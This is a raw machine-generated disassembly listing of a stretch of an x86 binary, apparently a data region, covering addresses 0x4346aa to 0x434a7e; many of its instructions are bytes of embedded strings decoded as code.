  4346aa:	add    BYTE PTR [edi+0x46],bh
  4346ad:	inc    ebx
  4346ae:	add    BYTE PTR [ebx-0x78ffbcba],al
  4346b4:	inc    esi
  4346b5:	inc    ebx
  4346b6:	add    BYTE PTR [eax+ebp*1+0x47180010],dl
  4346bd:	adc    BYTE PTR [eax],al
  4346bf:	adc    dh,BYTE PTR [ecx+0x10]
  4346c2:	add    BYTE PTR [edi+0x2c001065],al
  4346c8:	push   0x5aa20010
  4346cd:	adc    BYTE PTR [eax],al
  4346cf:	rol    DWORD PTR [eax+edx*1],0x0
  4346d3:	int    0x6f
  4346d5:	adc    BYTE PTR [eax],al
  4346d7:	mov    bh,0x46
  4346d9:	inc    ebx
  4346da:	add    BYTE PTR [ebx-0x40ffbcba],bh
  4346e0:	inc    esi
  4346e1:	inc    ebx
  4346e2:	add    bl,al
  4346e4:	inc    esi
  4346e5:	inc    ebx
  4346e6:	add    bh,al
  4346e8:	inc    esi
  4346e9:	inc    ebx
  4346ea:	add    bl,cl
  4346ec:	inc    esi
  4346ed:	inc    ebx
  4346ee:	add    bh,cl
  4346f0:	inc    esi
  4346f1:	inc    ebx
  4346f2:	add    bl,dl
  4346f4:	inc    esi
  4346f5:	inc    ebx
  4346f6:	add    BYTE PTR [ebx+0x54001005],dh
  4346fc:	push   ebp
  4346fd:	adc    BYTE PTR [eax],al
  4346ff:	sbb    bh,BYTE PTR [eax]
  434701:	adc    BYTE PTR [eax],al
  434703:	mov    edx,0x2f001013
  434708:	dec    edx
  434709:	adc    BYTE PTR [eax],al
  43470b:	inc    ecx
  43470c:	or     edx,DWORD PTR [eax]
  43470e:	add    BYTE PTR [ebx+0x19],ch
  434711:	adc    BYTE PTR [eax],al
  434713:	mov    esp,0xf700103e
  434718:	inc    esi
  434719:	inc    ebx
  43471a:	add    bl,bh
  43471c:	inc    esi
  43471d:	inc    ebx
  43471e:	add    bh,bh
  434720:	inc    esi
  434721:	inc    ebx
  434722:	add    BYTE PTR [ebx],al
  434724:	inc    edi
  434725:	inc    ebx
  434726:	add    BYTE PTR [edi],al
  434728:	inc    edi
  434729:	inc    ebx
  43472a:	add    BYTE PTR [ebx],cl
  43472c:	inc    edi
  43472d:	inc    ebx
  43472e:	add    BYTE PTR [edi],cl
  434730:	inc    edi
  434731:	inc    ebx
  434732:	add    BYTE PTR [ebx],dl
  434734:	inc    edi
  434735:	inc    ebx
  434736:	add    BYTE PTR [edi-0x27ffef96],ch
  43473c:	imul   edx,DWORD PTR [eax],0x0
  43473f:	sahf   
  434740:	push   ss
  434741:	adc    BYTE PTR [eax],al
  434743:	jle    0x43477f
  434745:	adc    BYTE PTR [eax],al
  434747:	jbe    0x43475e
  434749:	adc    BYTE PTR [eax],al
  43474b:	cmp    DWORD PTR [edi+0x10],edx
  43474e:	add    BYTE PTR [ebp+0x59001066],bl
  434754:	adc    al,0x10
  434756:	add    BYTE PTR [edi],dh
  434758:	inc    edi
  434759:	inc    ebx
  43475a:	add    BYTE PTR [ebx],bh
  43475c:	inc    edi
  43475d:	inc    ebx
  43475e:	add    BYTE PTR [edi],bh
  434760:	inc    edi
  434761:	inc    ebx
  434762:	add    BYTE PTR [ebx+0x47],al
  434765:	inc    ebx
  434766:	add    BYTE PTR [edi+0x47],al
  434769:	inc    ebx
  43476a:	add    BYTE PTR [ebx+0x47],cl
  43476d:	inc    ebx
  43476e:	add    BYTE PTR [edi+0x47],cl
  434771:	inc    ebx
  434772:	add    BYTE PTR [ebx+0x47],dl
  434775:	inc    ebx
  434776:	add    BYTE PTR [ebx-0x6affef90],bh
  43477c:	inc    ebp
  43477d:	adc    BYTE PTR [eax],al
  43477f:	dec    ebx
  434780:	dec    eax
  434781:	adc    BYTE PTR [eax],al
  434783:	dec    ebx
  434784:	popa   
  434785:	adc    BYTE PTR [eax],al
  434787:	adc    al,BYTE PTR [eax+edx*1]
  43478a:	add    dh,dl
  43478c:	push   ds
  43478d:	adc    BYTE PTR [eax],al
  43478f:	hlt    
  434790:	pop    ds
  434791:	adc    BYTE PTR [eax],al
  434793:	dec    ecx
  434794:	pop    eax
  434795:	adc    BYTE PTR [eax],al
  434797:	ja     0x4347e0
  434799:	inc    ebx
  43479a:	add    BYTE PTR [ebx+0x47],bh
  43479d:	inc    ebx
  43479e:	add    BYTE PTR [edi+0x47],bh
  4347a1:	inc    ebx
  4347a2:	add    BYTE PTR [ebx-0x78ffbcb9],al
  4347a8:	inc    edi
  4347a9:	inc    ebx
  4347aa:	add    BYTE PTR [ebx-0x70ffbcb9],cl
  4347b0:	inc    edi
  4347b1:	inc    ebx
  4347b2:	add    BYTE PTR [ebx+0x4d004347],dl
  4347b8:	push   edi
  4347b9:	xor    DWORD PTR [ecx],esi
  4347bb:	cmp    BYTE PTR [edi+ebx*2],dh
  4347be:	push   ecx
  4347bf:	add    BYTE PTR [edx+0x33],dl
  4347c2:	push   esi
  4347c3:	xor    eax,0x3849515f
  4347c8:	xor    al,0x59
  4347ca:	push   edi
  4347cb:	add    BYTE PTR [ebx+0x54],al
  4347ce:	inc    ebp
  4347cf:	pop    edi
  4347d0:	dec    ebx
  4347d1:	push   edx
  4347d2:	push   ebp
  4347d3:	add    BYTE PTR ss:[esp+eax*2+0x53],cl
  4347d8:	pop    edi
  4347d9:	aaa    
  4347da:	xor    al,0x32
  4347dc:	xor    BYTE PTR [edi+0x5f],al
  4347df:	inc    ebx
  4347e0:	pop    edx
  4347e1:	add    BYTE PTR [edi+0x4e],al
  4347e4:	cmp    DWORD PTR [edi+0x47],ebx
  4347e7:	push   ebx
  4347e8:	cmp    DWORD PTR [edi+0x4e],edx
  4347eb:	add    BYTE PTR [ecx+0x44],dl
  4347ee:	cmp    BYTE PTR [edi+0x33],bl
  4347f1:	cmp    BYTE PTR [eax],dh
  4347f3:	pop    edi
  4347f4:	inc    ecx
  4347f5:	dec    edi
  4347f6:	inc    esi
  4347f7:	push   eax
  4347f8:	add    BYTE PTR [edx+0x43],dl
  4347fb:	xor    eax,0x41305f30
  434800:	xor    BYTE PTR [esi+0x5f],al
  434803:	inc    ebx
  434804:	xor    dh,BYTE PTR [edx]
  434806:	xor    eax,0x36545200
  43480b:	xor    al,0x5f
  43480d:	dec    esi
  43480e:	xor    esi,DWORD PTR [edx]
  434810:	add    BYTE PTR ss:[eax+0x4b],cl
  434814:	inc    ebx
  434815:	pop    edi
  434816:	ss xor al,0x34
  434819:	pop    edi
  43481a:	inc    ecx
  43481b:	push   esp
  43481c:	dec    edi
  43481d:	add    BYTE PTR [esi+0x52],dl
  434820:	push   esi
  434821:	pop    edi
  434822:	inc    esi
  434823:	push   ecx
  434824:	push   ebp
  434825:	push   edx
  434826:	dec    eax
  434827:	add    BYTE PTR [esi+0x41],cl
  43482a:	inc    edx
  43482b:	pop    edi
  43482c:	xor    DWORD PTR [ecx],edi
  43482e:	push   edi
  43482f:	pop    edi
  434830:	pop    edx
  434831:	xor    eax,0x47003934
  434836:	push   edx
  434837:	push   ebp
  434838:	pop    edi
  434839:	xor    al,BYTE PTR [edx+0x30]
  43483c:	push   ebx
  43483d:	dec    esi
  43483e:	xor    eax,0x38564300
  434843:	xor    al,0x5f
  434845:	xor    bl,BYTE PTR [eax+0x36]
  434848:	inc    edx
  434849:	pop    edi
  43484a:	pop    ecx
  43484b:	xor    al,BYTE PTR [ecx+0x0]
  43484e:	push   edi
  43484f:	dec    ecx
  434850:	push   ebx
  434851:	xor    DWORD PTR [eax],edi
  434853:	pop    edi
  434854:	push   ecx
  434855:	xor    BYTE PTR [edx+0x5f],cl
  434858:	inc    ecx
  434859:	add    BYTE PTR ss:[edx+0x45],al
  43485d:	push   edi
  43485e:	cmp    DWORD PTR [eax],edi
  434860:	pop    edi
  434861:	inc    edx
  434862:	xor    eax,0x36520057
  434867:	aaa    
  434868:	xor    BYTE PTR [edi],dh
  43486a:	pop    edi
  43486b:	inc    edx
  43486c:	cmp    DWORD PTR [edi+0x52],eax
  43486f:	dec    esp
  434870:	pop    edi
  434871:	dec    ebx
  434872:	add    BYTE PTR [esp+edx*2+0x30],al
  434876:	pop    edi
  434877:	push   ebp
  434878:	push   ebx
  434879:	aaa    
  43487a:	dec    ebp
  43487b:	pop    edi
  43487c:	xor    ecx,DWORD PTR [edx+0x4e]
  43487f:	dec    ebx
  434880:	dec    edx
  434881:	add    BYTE PTR [edi+0x47],al
  434884:	xor    eax,0x534e5f32
  434889:	push   esp
  43488a:	pop    edi
  43488b:	push   esp
  43488c:	inc    edx
  43488d:	inc    esi
  43488e:	inc    esp
  43488f:	add    BYTE PTR [ebp+0x4e],al
  434892:	inc    edi
  434893:	cmp    DWORD PTR [edi+0x57],ebx
  434896:	push   eax
  434897:	push   ecx
  434898:	pop    edi
  434899:	dec    edi
  43489a:	inc    ebx
  43489b:	push   edi
  43489c:	pop    edi
  43489d:	inc    edi
  43489e:	add    BYTE PTR [edi+0x45],dl
  4348a1:	inc    esi
  4348a2:	pop    edi
  4348a3:	push   edx
  4348a4:	inc    edx
  4348a5:	pop    eax
  4348a6:	inc    edi
  4348a7:	ss pop edi
  4348a9:	push   esi
  4348aa:	inc    ebx
  4348ab:	dec    esi
  4348ac:	inc    esp
  4348ad:	add    BYTE PTR [edi+0x4d],cl
  4348b0:	inc    edi
  4348b1:	xor    ebx,DWORD PTR [edi+0x34]
  4348b4:	dec    esi
  4348b5:	pop    edx
  4348b6:	cmp    BYTE PTR [edi+0x58],bl
  4348b9:	cmp    BYTE PTR [eax],al
  4348bb:	push   edx
  4348bc:	pop    eax
  4348bd:	push   ecx
  4348be:	pop    edi
  4348bf:	dec    esp
  4348c0:	push   edx
  4348c1:	dec    ecx
  4348c2:	dec    edi
  4348c3:	inc    esp
  4348c4:	pop    edi
  4348c5:	dec    edi
  4348c6:	xor    eax,DWORD PTR [eax+eax*1+0x43]
  4348ca:	push   eax
  4348cb:	inc    ebp
  4348cc:	pop    edi
  4348cd:	xor    eax,0x565f3945
  4348d2:	add    BYTE PTR [edi+0x4e],al
  4348d5:	push   esi
  4348d6:	pop    edi
  4348d7:	inc    edi
  4348d8:	push   esp
  4348d9:	dec    eax
  4348da:	xor    dh,BYTE PTR [ecx]
  4348dc:	pop    edi
  4348dd:	dec    edi
  4348de:	xor    eax,DWORD PTR ss:[eax]
  4348e1:	inc    esp
  4348e2:	inc    ebp
  4348e3:	dec    ecx
  4348e4:	pop    edi
  4348e5:	push   edx
  4348e6:	dec    eax
  4348e7:	xor    al,0x48
  4348e9:	dec    ecx
  4348ea:	ss pop edi
  4348ec:	aaa    
  4348ed:	aaa    
  4348ee:	dec    ecx
  4348ef:	dec    ebp
  4348f0:	add    BYTE PTR [eax+0x54],cl
  4348f3:	ss pop edi
  4348f5:	inc    esi
  4348f6:	inc    edx
  4348f7:	xor    dh,BYTE PTR [eax+eax*1]
  4348fa:	dec    esi
  4348fb:	ss dec edx
  4348fd:	pop    edi
  4348fe:	dec    ecx
  4348ff:	dec    esp
  434900:	inc    edi
  434901:	inc    esp
  434902:	dec    eax
  434903:	xor    BYTE PTR [eax],bh
  434905:	xor    eax,0x34004f00
  43490a:	add    BYTE PTR [eax+eax*1+0x33],cl
  43490e:	add    BYTE PTR [edi],dh
  434910:	add    BYTE PTR [eax],dh
  434912:	add    BYTE PTR [edi+0x0],bl
  434915:	inc    esp
  434916:	add    BYTE PTR [edi+0x0],al
  434919:	dec    ebx
  43491a:	add    BYTE PTR [edx],dh
  43491c:	add    BYTE PTR [ecx+0x0],al
  43491f:	inc    ebx
  434920:	add    BYTE PTR [eax],al
  434922:	add    BYTE PTR [edi+0x0],cl
  434925:	xor    al,BYTE PTR [eax]
  434927:	xor    eax,DWORD PTR [eax]
  434929:	pop    edi
  43492a:	add    BYTE PTR [edi+0x0],dl
  43492d:	xor    al,BYTE PTR [eax]
  43492f:	dec    edi
  434930:	add    BYTE PTR [edi+0x0],bl
  434933:	pop    edx
  434934:	add    BYTE PTR [eax],al
  434936:	add    BYTE PTR [eax+0x0],bl
  434939:	dec    esp
  43493a:	add    BYTE PTR [ecx],bh
  43493c:	add    BYTE PTR [edi+0x0],bl
  43493f:	dec    ebx
  434940:	add    BYTE PTR [ecx+0x0],al
  434943:	dec    edx
  434944:	add    BYTE PTR [esi+0x0],al
  434947:	xor    DWORD PTR [eax],eax
  434949:	xor    al,0x0
  43494b:	pop    edi
  43494c:	add    BYTE PTR [eax+0x0],bl
  43494f:	inc    edi
  434950:	add    BYTE PTR [edx+0x0],al
  434953:	add    BYTE PTR [eax],al
  434955:	push   eax
  434956:	add    BYTE PTR [ebx],dh
  434958:	add    BYTE PTR [esi+0x0],cl
  43495b:	pop    edi
  43495c:	add    BYTE PTR [eax+0x0],cl
  43495f:	xor    eax,0x5f005300
  434964:	add    BYTE PTR [eax+0x0],cl
  434967:	add    BYTE PTR [eax],al
  434969:	dec    ebp
  43496a:	add    BYTE PTR [eax],dh
  43496c:	add    BYTE PTR [edx+0x0],al
  43496f:	pop    edi
  434970:	add    BYTE PTR [edx+0x0],cl
  434973:	pop    eax
  434974:	add    BYTE PTR [eax+eax*1+0x49],dl
  434978:	add    BYTE PTR [eax+eax*1+0x39],cl
  43497c:	add    BYTE PTR [eax+eax*1+0x0],cl
  434980:	add    BYTE PTR [ecx+0x0],al
  434983:	xor    eax,DWORD PTR [eax]
  434985:	xor    BYTE PTR [eax],al
  434987:	pop    edi
  434988:	add    BYTE PTR [ecx+0x0],al
  43498b:	pop    edx
  43498c:	add    BYTE PTR [ecx+0x0],dl
  43498f:	pop    edx
  434990:	add    BYTE PTR [ecx],bh
  434992:	add    BYTE PTR [esi],dh
  434994:	add    BYTE PTR [edi+0x0],bl
  434997:	dec    eax
  434998:	add    BYTE PTR [eax+eax*1+0x5a],cl
  43499c:	add    BYTE PTR [eax],al
  43499e:	add    BYTE PTR [ecx+0x0],dl
  4349a1:	push   edi
  4349a2:	add    BYTE PTR [ecx+0x0],bl
  4349a5:	pop    edi
  4349a6:	add    BYTE PTR [esi+0x0],dl
  4349a9:	xor    al,0x0
  4349ab:	inc    esp
  4349ac:	add    BYTE PTR [ecx],dh
  4349ae:	add    BYTE PTR [eax],bh
  4349b0:	add    BYTE PTR [edx],dh
  4349b2:	add    BYTE PTR [edi+0x0],bl
  4349b5:	cmp    DWORD PTR [eax],eax
  4349b7:	push   esp
  4349b8:	add    BYTE PTR [eax+eax*1+0x0],dl
  4349bc:	add    BYTE PTR [esi+0x0],dl
  4349bf:	dec    edi
  4349c0:	add    BYTE PTR [edi+0x0],al
  4349c3:	add    BYTE PTR ss:[edi+0x0],bl
  4349c7:	dec    edi
  4349c8:	add    BYTE PTR [edx+0x0],bl
  4349cb:	inc    ebp
  4349cc:	add    BYTE PTR [eax],dh
  4349ce:	add    BYTE PTR [ebp+0x0],al
  4349d1:	xor    BYTE PTR [eax],al
  4349d3:	pop    edi
  4349d4:	add    BYTE PTR [eax],dh
  4349d6:	add    BYTE PTR ds:0x4f000000,dh
  4349dc:	add    BYTE PTR ds:0x5f005700,dh
  4349e2:	add    BYTE PTR [edi],dh
  4349e4:	add    BYTE PTR [ebx+0x0],dl
  4349e7:	push   ebp
  4349e8:	add    BYTE PTR [edi+0x0],al
  4349eb:	xor    al,0x0
  4349ed:	pop    edi
  4349ee:	add    BYTE PTR [ecx+0x0],dl
  4349f1:	inc    esp
  4349f2:	add    BYTE PTR [eax],al
  4349f4:	add    BYTE PTR [edx+0x0],dl
  4349f7:	push   esp
  4349f8:	add    BYTE PTR ds:0x52005f00,dh
  4349fe:	add    BYTE PTR [edi+0x0],dl
  434a01:	xor    al,BYTE PTR [eax]
  434a03:	xor    al,BYTE PTR [eax]
  434a05:	xor    BYTE PTR [eax],al
  434a07:	xor    BYTE PTR [eax],al
  434a09:	pop    edi
  434a0a:	add    BYTE PTR [esi],dh
  434a0c:	add    BYTE PTR [eax],al
  434a0e:	add    BYTE PTR [eax+0x0],cl
  434a11:	inc    ebp
  434a12:	add    BYTE PTR [eax+eax*1+0x30],cl
  434a16:	add    BYTE PTR [edi+0x0],bl
  434a19:	dec    edx
  434a1a:	add    BYTE PTR [edx],dh
  434a1c:	add    BYTE PTR [edi],dh
  434a1e:	add    BYTE PTR [ebp+0x0],dl
  434a21:	add    BYTE PTR ss:[eax],dh
  434a24:	add    BYTE PTR [eax],al
  434a26:	add    BYTE PTR [esi+0x0],dl
  434a29:	cmp    BYTE PTR [eax],al
  434a2b:	dec    edi
  434a2c:	add    BYTE PTR [ecx],bh
  434a2e:	add    BYTE PTR [edi+0x0],bl
  434a31:	pop    eax
  434a32:	add    BYTE PTR [edx+0x0],bl
  434a35:	dec    esp
  434a36:	add    BYTE PTR [ebx+0x0],cl
  434a39:	add    BYTE PTR [eax],al
  434a3b:	dec    ecx
  434a3c:	add    BYTE PTR [ebp+0x0],dl
  434a3f:	dec    edi
  434a40:	add    BYTE PTR [eax],al
  434a42:	add    BYTE PTR [edx+0x53],dl
  434a45:	inc    esp
  434a46:	push   ebx
  434a47:	cmp    ebp,edx
  434a49:	inc    ebx
  434a4a:	add    eax,0x4d0fb663
  434a4f:	nop
  434a50:	jge    0x434a72
  434a52:	jae    0x434aca
  434a54:	shl    DWORD PTR [eax],1
  434a56:	inc    ebp
  434a57:	sbb    al,BYTE PTR [eax]
  434a59:	add    BYTE PTR [eax],al
  434a5b:	push   ebx
  434a5c:	cmp    bl,BYTE PTR [ecx+eiz*2+0x76]
  434a60:	jne    0x434adb
  434a62:	ins    DWORD PTR es:[edi],dx
  434a63:	dec    ecx
  434a64:	jb     0x434ae0
  434a66:	pop    esp
  434a67:	bound  di,DWORD PTR [edx+0x52]
  434a6b:	gs fs push ax
  434a6f:	arpl   WORD PTR [esi+0x5c],si
  434a72:	js     0x434ace
  434a74:	je     0x434abd
  434a76:	jno    0x434aba
  434a78:	jno    0x434ae1
  434a7a:	bound  ebp,QWORD PTR [esi]
  434a7c:	jo     0x434ae2
  434a7e:	bound  eax,QWORD PTR [eax]
	...
